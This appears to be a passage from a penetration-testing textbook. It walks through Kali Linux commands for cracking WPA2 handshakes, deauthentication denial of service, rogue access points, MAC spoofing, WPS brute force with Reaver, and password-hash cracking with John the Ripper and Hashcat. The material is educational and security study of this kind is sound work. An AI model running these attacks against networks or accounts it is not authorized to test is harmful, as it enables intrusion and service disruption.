| Note: The ALFA NETWORK cards, specifically the AWUS036NH adapters are highly recommended for reliable wireless pen testing with Kali. These cards support wireless protocols 802.11 b, g, and n and are easily accessible online. While in this chapter, we utilize the TP-Link WN722N external Wi-Fi adapter; please note that manual driver setup is required for it to function properly with Kali Linux. |

[Wireless network exploitation techniques](#contents.xhtml_sc2_185a)

Within the realm of wireless network security, there exist several exploitation techniques that can be utilized to gain unauthorized access to a wireless network.

[Compromising WPA/WPA2 encryption](#contents.xhtml_sc3_186a)

WPA/WPA2 is a widely used security protocol to secure wireless networks, but it remains vulnerable to attacks such as brute-force and dictionary attacks. In this section, we will delve into the technical steps of compromising WPA/WPA2 encryption. Let us explore the step-by-step approach to cracking WPA/WPA2 encryption for wireless networks:

1.  First, check if your network adapter is connected and if you can see your wireless interface by using the iwconfig command, as shown in [Figure 7.18](#ch07.xhtml_fig7-18):

    ![](images/Figure_7.18_.png)

    Figure 7.18: Checking if the network adapter is connected

2.  Next, enable monitoring mode for your wireless interface by using the sudo airmon-ng start wlan0 command. [Figure 7.19](#ch07.xhtml_fig7-19) depicts the monitoring mode enabled interface as wlan0:

    ![](images/Figure_7.19_.png)

    Figure 7.19: Enabling monitoring mode for wireless interface

3.  To capture packets from the targeted wireless Access Point (AP), obtain the BSSID and broadcasting channel by running the command sudo airodump-ng wlan0 --essid <ESSID Name>, as shown in [Figure 7.20](#ch07.xhtml_fig7-20). Here ESSID stands for Extended Service Set Identifier.

    ![](images/Figure_7.20_.png)

    Figure 7.20: Obtaining the BSSID and broadcasting channel

4.  Once you have the BSSID and broadcasting channel information, run the command sudo airodump-ng wlan0 -c 1 -b C4:E5:32:A1:E0:28 -w <output_file> to capture packets from the AP, as shown in [Figure 7.21](#ch07.xhtml_fig7-21) and 7.22.

    [Figure 7.21](#ch07.xhtml_fig7-21) illustrates the command required to capture packets:

    ![](images/Figure_7.21_.png)

    Figure 7.21: Command for packet capturing

    [Figure 7.22](#ch07.xhtml_fig7-22) displays the output of the packet capture command:

    ![](images/Figure_7.22.png)

    Figure 7.22: Capturing packets from the AP

5.  To generate IVs, deauthenticate the client connected to the AP by running the command sudo aireplay-ng --deauth 0 -c C8:94:02:B4:66:71 -a C4:E5:32:A1:E0:28 wlan0. After deauthenticating clients, capture the handshake, which includes the WPA2 key or passphrase. See [Figure 7.23](#ch07.xhtml_fig7-23):

    ![](images/Figure_7.23_.png)

    Figure 7.23: Deauthenticating the client connected to the AP

    You can crack the WPA2 password by either brute force or dictionary attacks. To brute force, use the crunch tool by running the command sudo crunch 8 8 B123790 -o newwordlist.txt && sudo aircrack-ng -w newwordlist.txt newpcaptureoutput-01.cap, as shown in [Figure 7.24](#ch07.xhtml_fig7-24) and 7.25. After a successful dictionary attack, you can obtain the exact password of the targeted AP. [Figure 7.24](#ch07.xhtml_fig7-24) illustrates the command required for password cracking :

    ![](images/Figure_7.24_.png)

    Figure 7.24: Cracking the WPA2 password

    [Figure 7.25](#ch07.xhtml_fig7-25) displays the output of the command for password cracking:

    ![](images/Figure_7.25_.png)

    Figure 7.25: Crack the WPA2 password (output)

| Note: Airmon-ng enables monitor mode, Airodump-ng captures network packets, Aireplay-ng injects traffic for testing, and Crunch generates customized wordlists. These tools are essential for wireless pentesting, providing capabilities for monitoring, capturing, injecting, and generating data during security assessments. |

[Man-in-the-middle attacks with rogue access points](#contents.xhtml_sc3_187a)

In this section, we will discuss the steps to perform a MITM attack on a wireless network, involving intercepting and modifying communication between the access point and clients. We will demonstrate a MITM attack using a rogue access point:

1.  Connect the TP-Link WN722N or any external Wi-Fi adapter to your Kali Linux machine after ensuring that it is in monitoring mode, to proceed with the steps.

2.  Create a rogue access point with a customized SSID and security settings using the command sudo airbase-ng -e <SSID> -c <channel> -P wlan0 as illustrated in [Figure 7.26](#ch07.xhtml_fig7-26):

    ![](images/Figure_7.26_.png)

    Figure 7.26: Creating a rogue access point with a customized SSID

3.  Clients connecting to the rogue access point will have their traffic redirected through your Kali Linux machine, allowing potential MITM attacks as illustrated in [Figure 7.27](#ch07.xhtml_fig7-27):

    ![](images/Figure_7.27_.png)

    Figure 7.27: Clients connecting to the rogue access point

| Note: There are several techniques for Man-in-the-Middle (MITM) attacks in wireless and Access Point (AP) environments, including ARP Spoofing, Rogue AP, Evil Twin Attack, Wi-Fi Pineapple, and DNS Spoofing. These techniques allow attackers to intercept and manipulate wireless communication traffic, providing a comprehensive MITM record for analysis. |

[Bypassing hidden SSIDs](#contents.xhtml_sc3_188a)

Detecting a hidden SSID can be useful in various situations, such as when performing a security audit on a wireless network. The mdk3 tool can be used to detect hidden SSIDs. Here are the steps involved:

1.  Install mdk3 by running the command sudo apt install mdk3 on the terminal as shown in [Figure 7.28](#ch07.xhtml_fig7-28):

    ![](images/Figure_7.28_.png)

    Figure 7.28: Installing mdk3

2.  To scan for available wireless networks, use the command sudo airodump-ng wlan0. In the output, you can observe that the SSID for the network with the MAC address C4:E5:32:A1:E0:28 is hidden, and it is operating on channel 11 See [Figure 7.29](#ch07.xhtml_fig7-29):

    ![](images/Figure_7.29_.png)

    Figure 7.29: Scan for available wireless networks

3.  Start mdk3 in bruteforce mode by running the command sudo mdk3 wlan0 p -b l -c 11 -t <MAC of target access point> on the terminal. This tool set will detect the hidden SSID name based on the following denotation given in [Figure 7.30](#ch07.xhtml_fig7-30):

    *   p indicates the bruteforce mode (ESSID Probing)

    *   -b selects the full bruteforce mode

    *   l specifies the character set to use (lower case alphabets)

    *   -t is the MAC or the BSSID of the target access point

    *   -c specifies the channel to use (in this case, channel 11)

        ![](images/Figure_7.30_.png)

    Figure 7.30: Starting mdk3 in bruteforce mode

Other denotations commonly used to detect hidden SSIDs include:

| S No | Denotations | Description |
| 1 | U | upper case |
| 2 | N | digits |
| 3 | A | all printed |
| 4 | C | lower and upper case |
| 5 | M | lower and upper case plus numbers |
| 6 | C | channel |

Table 7.1: Command denotation

After running the mdk3 command, the hidden SSID name will be displayed on the terminal, which can be used for further attacks. This information is valuable as it reveals the name of a previously hidden network, enabling an attacker to target the network in various ways.

| Note: A hidden SSID is a Wi-Fi network that does not broadcast its name, making it undetectable through regular scans. It can be revealed by actively scanning for probe responses or utilizing tools like Airodump-ng to capture and uncover the hidden SSID by analyzing probe responses. |

[Bypassing MAC and open authentication](#contents.xhtml_sc3_189a)

Wireless networks may utilize security measures such as MAC address authentication or open authentication to prevent unauthorized access. However, these measures are not foolproof and can be easily bypassed using various tools and techniques. In this section, we will explore the steps required to bypass MAC address authentication and open authentication on a wireless network:

1.  Proceed with steps 1 to 2 from the previous section on Compromising WPA/WPA2 Encryption to gather essential information about the intended client, including its MAC address. This MAC address will then be utilized to spoof our Wi-Fi adapter’s MAC address, tricking the targeted Wi-Fi router into believing that the connection request originates from the whitelisted MAC address exclusively.

2.  Then, we need to take down the monitoring interface wlan0, which we can do by executing the command sudo airmon-ng stop wlan0 also shown in [Figure 7.31](#ch07.xhtml_fig7-31):

    ![](images/Figure_7.31_.png)

    Figure 7.31: Take down the monitoring interface wlan0

3.  Temporarily disable the network manager by executing the command sudo systemctl stop NetworkManager as depicted in [Figure 7.32](#ch07.xhtml_fig7-32):

    ![](images/Figure_7.32_.png)

    Figure 7.32: Temporarily disable the network manager

4.  After that, we can take down the wireless interface whose MAC address we want to spoof using the command sudo ifconfig wlan0 down as illustrated in [Figure 7.33](#ch07.xhtml_fig7-33):

    ![](images/Figure_7.33_.png)

    Figure 7.33: Take down the wireless interface

5.  With the interface down, we can now use macchanger to change the MAC address. Run the command sudo macchanger -m [New MAC Address] wlan0 as shown in [Figure 7.34](#ch07.xhtml_fig7-34) to set the new MAC address:

    ![](images/Figure_7.34_.png)

    Figure 7.34: Using macchanger to change the MAC address

6.  Bring the interface back up by executing the command sudo ifconfig wlan0 up as shown in [Figure 7.35](#ch07.xhtml_fig7-35):

    ![](images/Figure_7.35_.png)

    Figure 7.35: Bringing the interface back up

7.  Restore the network manager functionality by issuing the command sudo systemctl start NetworkManager as illustrated in [Figure 7.36](#ch07.xhtml_fig7-36):

    ![](images/Figure_7.36_.png)

    Figure 7.36: Restoring the network manager

8.  Now that we have changed the MAC address of our wireless adapter to a whitelisted MAC address in the router, we can try to authenticate with the network. These steps can bypass MAC address authentication and open authentication used by some wireless networks. If all goes well, we should be able to connect as shown in [Figure 7.37](#ch07.xhtml_fig7-37):

    ![](images/Figure_7.37_.png)

    Figure 7.37: Changed MAC address

| Note: Untraceable malicious activities, potential data breaches, and unauthorized network usage are risks introduced by spoofing MAC addresses to bypass access point security. It undermines network security, accountability, and increases vulnerability to attacks, as unauthorized devices infiltrate the network. |

[Denial-of-service attacks](#contents.xhtml_sc3_190a)

Wireless DoS attacks can have a significant impact on the availability and performance of wireless networks, rendering them inaccessible to genuine users. These attacks can exploit vulnerabilities in wireless Access Points (APs) or client devices, resulting in crashes or unresponsiveness. Deauthentication attacks, beacon flood attacks, and jamming attacks are common types of wireless DoS attacks.

For practical understanding of sending repeated deauthentication frames to the AP, we can follow the steps outlined below:

1.  To begin, we need to enable the secondary Wi-Fi adapter in monitoring mode. [Figure 7.38](#ch07.xhtml_fig7-38) displays a comprehensive list of connected hosts associated with the targeted AP:

    ![](images/Figure_7.38_.png)

    Figure 7.38: List of connected hosts

2.  To launch a DoS attack on a wireless network, execute the command sudo aireplay-ng --deauth 1000 -a FC:DD:55:A1:C2:F3 -h f2:8a:b2:df:90:3f wlan0 to send multiple deauthentication frames to the AP, as shown in [Figure 7.39](#ch07.xhtml_fig7-39):

    ![](images/Figure_7.39_.png)

    Figure 7.39: DoS attack on a wireless network

    Let us break down the command and its parameters as follows:

    *   aireplay-ng: This is the name of the tool being used to perform the attack.

    *   --deauth 1000: This parameter instructs aireplay-ng to send 1000 deauthentication packets to the target AP in order to disconnect the connected clients.

    *   -a FC:DD:55:A1:C2:F3: This parameter specifies the MAC address of the target access point.

    *   -h f2:8a:b2:df:90:3f: This parameter specifies the MAC address of the attacker’s wireless adapter.

3.  This attack aims to disrupt the connection between the client and the access point, effectively rendering the network inaccessible to authorized users. The client list diminishes as the DoS attack on the access point denies clients from connecting. To mitigate such attacks, network administrators should implement security measures including traffic filtering and access control to safeguard the network’s integrity and availability. See [Figure 7.40](#ch07.xhtml_fig7-40):

    ![](images/Figure_7.40_.png)

    Figure 7.40: Client list diminishes because of the DoS attack

| Note: AP DoS attacks disrupt wireless networks, leading to productivity loss, communication breakdowns, financial implications, reputational damage, and compromised trust. Robust security measures are crucial to minimize these risks. |

[Advanced wireless attacks](#contents.xhtml_sc2_191a)

Advanced wireless attacks play a crucial role in modern-day penetration testing, including attacking wireless routers using Reaver. Reaver exploits a vulnerability in WPS, which makes it easier to break into wireless networks. This attack is highly effective, and network administrators must be aware of its capabilities.

[Attacking wireless routers with Reaver](#contents.xhtml_sc3_192a)

Here are the technical steps to conduct an attack using Reaver:

1.  First, we need to identify the target router’s BSSID and channel, as we have already learned in the previous topics.

2.  Next, we can exploit the WPS vulnerability using Reaver by running the command sudo reaver -i wlan0 -b [BSSID] -vv -K 1 -c [channel]. Reaver will automatically brute-force the WPS PIN, and if successful, it will obtain the router’s WPA/WPA2 passphrase.

3.  Finally, we can connect to the router and gain access to the wireless network using the obtained passphrase. It is important to note that measures such as disabling WPS or using a strong passphrase can prevent such attacks.

It is important to know that the process of executing Reaver for WPS cracking can be time-consuming and does not guarantee a successful outcome in every case. However, we have provided a detailed explanation of the working command and a theoretical approach for your reference.

| Note: To prevent Reaver attacks, network administrators should disable WPS and use a strong passphrase for their wireless network. This is because the attack exploits WPS vulnerability and only works against routers that use WPS. |

[Conclusion](#contents.xhtml_sc2_193a)

To summarize, this chapter provides a comprehensive guide to wireless network pentesting, emphasizing the significance of comprehending wireless network fundamentals, security threats, and standards. The practical methodology, tools, and advanced attacks covered in this chapter will help penetration testers to identify vulnerabilities and develop effective countermeasures. It is important to adopt a structured approach to ensure thorough evaluations. Network administrators should take necessary measures to safeguard against vulnerabilities and threats and maintain a secure wireless network. The knowledge and skills obtained in this chapter are essential for anyone involved in securing wireless networks.

In the upcoming chapter, we will delve into the world of privilege escalation and network pivoting. We will explore the tools and techniques used for password and hash cracking, as well as post-exploitation procedures. The chapter aims to provide a comprehensive understanding of the advanced techniques used in penetration testing to identify vulnerabilities and strengthen security measures.

Join our book’s Discord space

Join the book's Discord Workspace for Latest updates, Offers, Tech happenings around the world, New Release and Sessions with the Authors:

**[https://discord.bpbonline.com](https://discord.bpbonline.com)**

![](images/fm1.png)

# [CHAPTER 8Hash Cracking and Post Exploitation](#contents.xhtml_ch08a)

[Introduction](#contents.xhtml_sc2_194a)

In this chapter, we will embark on a captivating journey into privilege escalation and network pivoting. Our exploration will encompass the cutting-edge tools and ingenious techniques employed for password and hash cracking. Moreover, we will navigate through the intricate landscape of post-exploitation procedures. This chapter aims to equip you with a comprehensive understanding of advanced techniques utilized in penetration testing, enabling you to uncover vulnerabilities and fortify security measures with the utmost precision and expertise.

[Structure](#contents.xhtml_sc2_195a)

In this chapter, we will discuss the following topics:

*   Exploring hash functions

*   Mastering password hashing

    *   Art of securing passwords

    *   Cutting-edge techniques: Salting and key stretching

*   Unleashing hash-cracking techniques

    *   Strategic approaches

*   Empowering hash-cracking arsenal

    *   Elite tools for hash warriors

    *   Online tools for hash warriors

*   Difference between hashing, encryption and encoding

*   post exploitation and lateral movement

*   Privilege escalation techniques

    *   Privilege escalation on Linux

    *   Privilege escalation on Windows

*   Exploring network pivoting

*   Persistence and lateral movement

    *   Strategies for persistent access and lateral movement

    *   persistence through hashdump techniques

    *   Exploring RDP for lateral movement

*   Unleashing the power of Mimikatz in meterpreter

[Objectives](#contents.xhtml_sc2_196a)

This chapter delves into advanced hash functions and password security techniques. It covers hash functions, password hashing, and security measures, followed by hash cracking strategies, including elite and online tools. The distinctions between hashing, encryption, and encoding are clarified. Post-exploitation and lateral movement significance is emphasized, covering Linux and Windows privilege escalation. The chapter explores network pivoting, persistence, and lateral movement and leverages Mimikatz in Meterpreter for advanced penetration testing.

[Exploring hash functions](#contents.xhtml_sc2_197a)

Exploring the complex realm of cryptography, we will come across hash functions as vital components, ensuring the integrity, authentication, and overall security of data. Our exploration entails understanding the purpose and properties of modern hash functions, as well as unraveling the complexities surrounding well-known algorithms like MD5, SHA-1, and SHA-256.

[Purpose and properties of modern hash functions](#contents.xhtml_sc3_198a)

At the heart of numerous cryptographic applications, hash functions assume a critical and fundamental role. These functions possess the ability to accept inputs of variable sizes and generate consistent-sized outputs known as hash values or message digests. Modern hash functions serve various key purposes and exhibit distinct properties, including:

*   Safeguarding data integrity and providing verification mechanisms

*   Enabling the implementation of digital signatures

*   Supporting secure storage and verification of passwords

[Unveiling common hash algorithms](#contents.xhtml_sc3_199a)

Let us dive into the realm of hash algorithms and explore some of the widely used ones:

*   Message Digest Algorithm 5 (MD5): MD5 is an age-old hash algorithm which generates a 128-bit hash value. Initially employed for data integrity and password storage, MD5 has lost its credibility due to vulnerabilities like collision attacks. Therefore, it is no longer recommended for cryptographic purposes.

*   Secure Hash Algorithm 1 (SHA-1): SHA-1 is a well-known hash algorithm that produces a 160-bit hash value. Although it was extensively used in cryptography, vulnerabilities have been uncovered, thus prompting its gradual replacement with more secure alternatives.

*   Secure Hash Algorithm 256-bit (SHA-256): SHA-256 belongs to the SHA-2 family and generates a robust 256-bit hash value. It is widely considered secure and finds its application in digital signatures, secure communication protocols, and even in blockchain technology. While SHA-256 is recommended, higher and more complex algorithms like SHA-512 are also available for enhanced security.

Here is [Table 8.1](#ch08.xhtml_tab8-1), showcasing some common hash algorithms along with their corresponding work factor and security level:

| Hash Algorithm | Work Factor | Security Level |
| MD5 | Low | Insecure |
| SHA-1 | Low | Insecure |
| SHA-256 | Medium | Secure |
| SHA-384 | High | Secure |
| SHA-512 | High | Secure |
| bcrypt | High | Very Secure |
| Argon2 | High | Very Secure |

Table 8.1: Common hash algorithms

| Note: To ensure that your cryptographic solutions align with your business or organizational requirements, it is essential to have a comprehensive understanding of the strengths and limitations of various hash algorithms. This knowledge empowers you to make informed decisions and establish a robust security baseline. |

[Mastering password hashing](#contents.xhtml_sc2_200a)

Gaining expertise in password hashing techniques is essential for pen testers when it comes to cracking password security. It entails understanding the robust measures implemented to protect user passwords from unauthorized cracking or hash matching. Let us delve into the art of fortifying passwords and explore advanced methods like salting and key stretching.

[Art of securing passwords](#contents.xhtml_sc3_201a)

Transforming passwords into irreversible hash values is a pivotal function of hashing algorithms. Safeguarding passwords extends beyond mere storage, encompassing cryptographic techniques to protect sensitive user credentials, even in a potential data breach. Let us explore several commonly utilized hashing algorithms in both Windows and Linux environments:

*   Windows password hashing

    *   NT LAN Manager (NTLM): Initially used, this older hashing algorithm has been found to possess vulnerabilities like weak encryption and susceptibility to offline attacks.

    *   NTLMv2: An enhanced and more recent iteration of NTLM, NTLMv2 incorporates stronger security measures and addresses some of the weaknesses inherent in its predecessor.

    *   Kerberos: Primarily utilized in Windows environments, Kerberos is a robust network authentication protocol that leverages powerful cryptographic algorithms to safeguard passwords.

*   Linux password hashing

    *   MD5, SHA-1, and SHA-256: Within Linux systems, the utilization of MD5 and SHA-1 is prevalent, yet they are deemed weak due to their vulnerabilities. Conversely, SHA-256 is a more robust algorithm that offers a 256-bit hash value and is widely employed for password storage.

    *   Bcrypt and scrypt: In Linux-based operating systems, bcrypt and scrypt stand out as popular password hashing algorithms. Bcrypt gains recognition for its adaptability and robustness against brute-force attacks, while scrypt earns acclaim for its memory-hard functions and bolstering defenses against hardware-based attacks.

[Cutting-edge techniques - Salting and key stretching](#contents.xhtml_sc3_202a)

Adding an extra layer of complexity to the password hashing process, salting involves appending a randomly generated value to the password before hashing. This technique substantially enhances the difficulty of cracking passwords using precomputed hash tables or rainbow tables, as it becomes challenging to isolate the original password from the combined salt. Consequently, even if two users have the same password, their hash values will differ. To illustrate, refer to [Figure 8.1](#ch08.xhtml_fig8-1), and consider the following scenario:

Password: ummedmeel123

Salt: exampleSALT

Salted password: ummedmeel123exampleSALT

Hashed password: 29A48295B77DE3420A15D967D357FF47

![](images/Figure_8.1.png)

Figure 8.1: Salting and key stretching

| Note: Key stretching is a vital technique used to strengthen password security. Methods like bcrypt and scrypt introduce computational costs, making the hashing process slower and more resistant to attacks. Apply key stretching to enhance protection against brute-force and dictionary attacks. |

[Unleashing hash cracking techniques](#contents.xhtml_sc2_203a)

Unlocking the secrets of hash cracking involves employing a wide range of tried and tested techniques to unveil passwords and dismantle their cryptographic safeguards. Let us embark on this deep-level exploration of hash cracking and unravel its mysteries:

[Strategic approaches](#contents.xhtml_sc3_204a)

There are various strategic approaches to hash cracking, each with its own set of advantages and limitations. They encompass the following techniques:

*   Brute force attacks: Involving systematic trial of every possible character combination, brute force attacks aim to crack passwords. While effective, longer and complex passwords with intricate encryption algorithms can make the process time-consuming.

*   Dictionary attacks: By leveraging pre-constructed wordlists, dictionary attacks systematically test common passwords, words, and phrases. This increases the likelihood of successful cracking.

*   Hybrid attacks: Combining elements of brute force and dictionary attacks, hybrid attacks modify dictionary words by incorporating variations like numbers, special characters, or custom patterns.

*   Rule-based attacks: Rule-based attacks utilize predefined patterns or rules to manipulate dictionary words or generate automatic variations. These include capitalization, character substitutions, and appending or prepending specific strings, among others.

*   Rainbow table attacks: Rainbow tables expedite the cracking process by utilizing precomputed tables containing hash values for a vast range of possible passwords. This eliminates the need for on-the-fly hash calculations.

| Note: Pentesters can enhance the overall system security of an organization by comprehending and implementing these hash cracking techniques. This enables them to assess the robustness of password security measures and pinpoint vulnerabilities effectively. |

[Empowering hash cracking arsenal](#contents.xhtml_sc2_205a)

Hash cracking is a fundamental process in cybersecurity that involves recovering original plain text from encrypted hash values. In the context of pentesting or audits, the practice of hash cracking plays a crucial role in evaluating password security strength and identifying potential impacts.

[Elite tools for hash warriors](#contents.xhtml_sc3_206a)

In this section, you will gain a valuable introduction to essential tools used by hash experts, boosting their ability to crack hashes effectively. These tools play a significant role in navigating the domain of password security with greater efficiency. Becoming acquainted with these tools will empower you to confidently address a range of challenges related to hash functions and safeguarding passwords.

[Hash-identifier](#contents.xhtml_sc4_207a)

Hash-identifier is a lightweight yet essential tool that assists in identifying different hash types. Determining the hash algorithm used is crucial before cracking a hash, as it significantly impacts the chosen cracking approach. This approach saves time, resources and improves overall efficiency.

Here is a step-by-step approach to using the hash-identifier tool in Kali Linux:

1.  Execute the hash-identifier tool by running the command hash-identifier as illustrated in [Figure 8.2](#ch08.xhtml_fig8-2):

    ![](images/Figure_8.2.png)

    Figure 8.2: Running the hash-identifier tool

2.  The hash-identifier tool will prompt you to input the hash value you wish to identify. Copy the hash value, paste it into the terminal, and press Enter. The hash-identifier tool will analyze the provided hash and present the identified hash algorithm or a list of potential matches, as showcased in [Figure 8.3](#ch08.xhtml_fig8-3):

    ![](images/Figure_8.3.png)

    Figure 8.3: Providing hash and identified hash algorithm

[John the Ripper](#contents.xhtml_sc4_208a)

John the Ripper is an esteemed and robust tool for cracking passwords, renowned for its flexibility and speed. It operates seamlessly on various platforms, including Windows, Linux, and macOS. Employing a diverse range of techniques such as dictionary attacks, brute force attacks, and hybrid attacks, it efficiently cracks password hashes. Furthermore, its versatility extends to supporting multiple hash types.

Case 1: A practical illustration for cracking Linux passwords

Let us consider a password hash extracted from a Linux system’s /etc/shadow file: username:$6$XZjHMrdYPINY/KQn$tRtmCrxpeKFIf1/DCsRgk8qPNPEv55qpPheJtceaKCrlRiYoMYrlWJN.JKiFmIeByMMy6R6ZQWz3LjNCL3g7Z0/. In this scenario, the hash algorithm employed is SHA-512, indicated by the presence of $6$. Our objective is to crack this password hash by utilizing John the Ripper. Follow the steps given below:

1.  Begin by creating a text file, such as hashes.txt, and paste the provided hash value into it. Finally, save the file. Follow the example depicted in [Figure 8.4](#ch08.xhtml_fig8-4):

    ![](images/Figure_8.4.png)

    Figure 8.4: Storing hash in a text file

2.  Open the terminal and execute the command john --format=sha512crypt --wordlist=/path/to/wordlist.txt hashes.txt to commence the password cracking process. Popular wordlists like rockyou.txt can be utilized, or you can create custom wordlists. This command will also present the progress and provide an estimated time remaining for each password attempt. See [Figure 8.5](#ch08.xhtml_fig8-5):

    ![](images/Figure_8.5.png)

    Figure 8.5: Cracking hash using John the Ripper

3.  Upon successfully cracking a password, John the Ripper will display the results on the screen. The cracked password(s) will be stored in a file named john.pot or an equivalent name within the John the Ripper directory. See [Figure 8.6](#ch08.xhtml_fig8-6):

    ![](images/Figure_8.6.png)

    Figure 8.6: Cracked password

Case 2: A practical illustration for cracking Windows passwords

1.  To begin the process of cracking NTLM hashes, you will need to obtain the specific NTLM hashes you wish to crack. These hashes are typically found in Windows environments, such as the Windows Security Accounts Manager (SAM) database or Active Directory (AD). For example, let us consider the NTLM hash username: 5fbc3d5fec8206a30f4b6c473d68ae76. Let us break down the process of NTLM hash cracking step by step, as outlined below: Open the terminal and execute the command sudo john –user=username --format=NT --wordlist=/path/to/wordlist.txt hashes.txt to commence the password cracking process. Popular wordlists like rockyou.txt can be utilized, or you can create custom wordlists. This command will also present the progress and provide an estimated time remaining for each password attempt. See [Figure 8.7](#ch08.xhtml_fig8-7):

    ![](images/Figure_8.7.png)

    Figure 8.7: Cracking hash using John the Ripper

2.  Upon successfully cracking a password, John the Ripper will display the results on the screen, similar to [Figure 8.8](#ch08.xhtml_fig8-8):

    ![](images/Figure_8.8.png)

    Figure 8.8: Cracked password

[John the Ripper Jumbo](#contents.xhtml_sc4_209a)

John the Ripper Jumbo is an enhanced version of John the Ripper which focuses on cracking complex passwords. It leverages the computational power of Graphics Processing Units (GPUs) and multi-core processors, enabling faster computations. John the Jumbo utilizes larger wordlists and rulesets to increase the chances of success in dictionary attacks.

[Hashcat](#contents.xhtml_sc4_210a)

Hashcat is a tool known for its ability to handle large-scale cracking tasks. It harnesses the computational power of GPUs to accelerate the cracking process, resulting in faster outcomes. Supporting a wide range of hash algorithms, Hashcat offers attack modes such as brute force, dictionary, combination, and mask attacks, making it a flexible choice for hash warriors.

Case: A practical illustration for cracking Linux passwords with Hashcat

Let us understand the process of hash cracking using Hashcat with the following step-by-step approach:

1.  Hashcat assigns a reference value to each hash function. To check the associated value of a hashing function, use the command hashcat -h | grep sha512, as illustrated in [Figure 8.9](#ch08.xhtml_fig8-9):

    ![](images/Figure_8.9.png)

    Figure 8.9: Associating value of the hashing functions

2.  Utilize the hashcat utility by running the command sudo hashcat -m 1800 -a 0 hash.txt /usr/share/wordlists/rockyou.txt -O. The -a flag denotes the attack mode, the -m flag represents the hash reference value, hash.txt specifies the file path of the hash to crack, and /usr/share/wordlists/rockyou.txt provides the path to the wordlist (such as rockyou.txt) or any other customized list you prefer. Once the hash is successfully cracked, the clear text password will be revealed. Due to the intensive GPU usage and the time-consuming nature of the process, it is not feasible to expect cracked passwords to be displayed in this scenario. See [Figure 8.10](#ch08.xhtml_fig8-10):

    ![](images/Figure_8.10.png)

    Figure 8.10: Cracking hash using Hashcat

3.  In Kali Linux, the rockyou.txt file is pre-installed within the /usr/share/wordlists directory. Alternatively, you can use other wordlists by executing the command locate wordlists | less, as illustrated in [Figure 8.11](#ch08.xhtml_fig8-11):

    ![](images/Figure_8.11.png)

    Figure 8.11: Wordlists in Kali Linux

[Online tools for hash warriors](#contents.xhtml_sc3_211a)

There are several online hash cracking tools available which typically offer a user-friendly interface and utilize powerful computing resources to crack hashes efficiently. However, it is important to note that using online hash cracking tools may come with security and privacy risks, so exercise caution and use only reputable and trusted platforms. Here are a few examples of online hash cracking tools:

[CrackStation](#contents.xhtml_sc4_212a)

To use CrackStation, an online hash cracking service, you can follow these steps:

1.  Launch your preferred web browser and go to the CrackStation website by entering the URL: [https://crackstation.net/](https://crackstation.net/), as illustrated in [Figure 8.12](#ch08.xhtml_fig8-12):

    ![](images/Figure_8.12.png)

    Figure 8.12: Open CrackStation website

2.  Paste or manually enter the hash value you wish to crack into this field, ensuring that the entered hash corresponds to the selected hash type. Click on the Crack Hashes button to initiate the cracking process. After CrackStation has completed the hash cracking process, it will display the resulting plaintext password if it successfully cracks the hash. In the event that the hash remains uncracked, CrackStation will indicate that the hash was not found in its database. See [Figure 8.13](#ch08.xhtml_fig8-13):

    ![](images/Figure_8.13.png)

    Figure 8.13: Cracking hash on CrackStation

[Hashes](#contents.xhtml_sc4_213a)

To use Hashes, you can follow the steps given below:

1.  Go to the Hashes website by entering the URL: [https://www.hashes.com/](https://www.hashes.com/). Paste or manually enter the hash value you wish to crack into this field and then click on the SUBMIT & SEARCH button or a similar button to initiate the cracking process, as depicted in [Figure 8.14](#ch08.xhtml_fig8-14):

    ![](images/Figure_8.14.png)

    Figure 8.14: Cracking hash on Hashes

2.  It will display the resulting plaintext password if it successfully cracks the hash, as depicted in [Figure 8.15](#ch08.xhtml_fig8-15):

    ![](images/Figure_8.15.png)

    Figure 8.15: Cracked hash

    Additionally, there are other online platforms available that serve the same purpose, including:

    *   Hash-identifier ([https://www.hashidentifier.com/](https://www.hashidentifier.com/))

    *   CrackHash ([https://www.crackhash.com/](https://www.crackhash.com/))

    *   OnlineHashCracker ([https://www.onlinehashcracker.com/](https://www.onlinehashcracker.com/))

    *   HashKiller ([https://hashkiller.io/](https://hashkiller.io/))

[Difference between hashing, encryption and encoding](#contents.xhtml_sc2_214a)

Here is [Table 8.2](#ch08.xhtml_tab8-2) outlining the differences between hashing, encryption, and encoding in a tabular format:

|  | Hashing | Encryption | Encoding |
| Definition | A one-way process of converting data into a fixed-size string of characters. | The process of converting data into a form that cannot be easily understood without the decryption key. | The process of converting data into a different representation format. |
| Purpose | Verify data integrity and uniqueness. | Protect data confidentiality. | Transform data for transmission or storage purposes. |
| Reversibility | Non-reversible. The original data cannot be retrieved from the hash value. | Reversible. The original data can be retrieved using the decryption key. | Reversible. The original data can be retrieved by decoding the encoded representation. |
| Key requirement | No key required. | Requires a key for both encryption and decryption. | No key required. |
| Use case | Password storage, data integrity checks. | Secure communication, data protection. | Data transmission, character set conversions. |
| Example algorithms | MD5, SHA-1, SHA-256. | AES, RSA, DES. | Base64, ASCII, URL encoding. |

Table 8.2: Difference between hashing, encryption and encoding

[Post exploitation and lateral movement](#contents.xhtml_sc2_215a)

The phases of post-exploitation and lateral movement play a crucial role in penetration testing. They are instrumental in evaluating the actual consequences of a breach, pinpointing vulnerabilities within the target network, and offering invaluable insights to bolster security measures.

[Understanding post exploitation](#contents.xhtml_sc3_216a)

Post exploitation involves an attacker or penetration tester exploring a compromised system, escalating privileges, and gathering critical information. Its goal is to assess the compromise, identify vulnerabilities, evaluate potential damage, and determine access level. It also provides insights to strengthen security defenses.

[Significance of lateral movement](#contents.xhtml_sc3_217a)

Lateral movement is a crucial aspect of post exploitation which involves exploring the target network, escalating privileges, and accessing sensitive information. It allows penetration testers to mimic skilled attackers, identify security weaknesses, and evaluate access controls. Lateral movement reveals hidden vulnerabilities and attack paths beyond the initial exploitation stage.

Several benefits can be derived from post exploitation and lateral movement in penetration testing, which are as follows:

*   Assessing the true impact

*   Identifying vulnerabilities

*   Testing detection and response capabilities

*   Providing recommendations for mitigation

*   Simulating real-world attack scenarios

[Privilege escalation techniques](#contents.xhtml_sc2_218a)

Let us delve into privilege escalation, which entails obtaining elevated access and privileges beyond the initial authorization on a system or network. This process involves leveraging vulnerabilities or misconfigurations to escalate privileges, enabling attackers to exceed their prescribed boundaries.

To grasp the concept better, we will explore real-life examples of privilege escalation in both Linux and Windows environments.

[Privilege escalation on Linux](#contents.xhtml_sc3_219a)

Let us explore the phases of Linux privilege escalation by following a systematic approach to achieve initial access, preparation, and privilege escalation.

[Phase 1: Initial access](#contents.xhtml_sc4_220a)

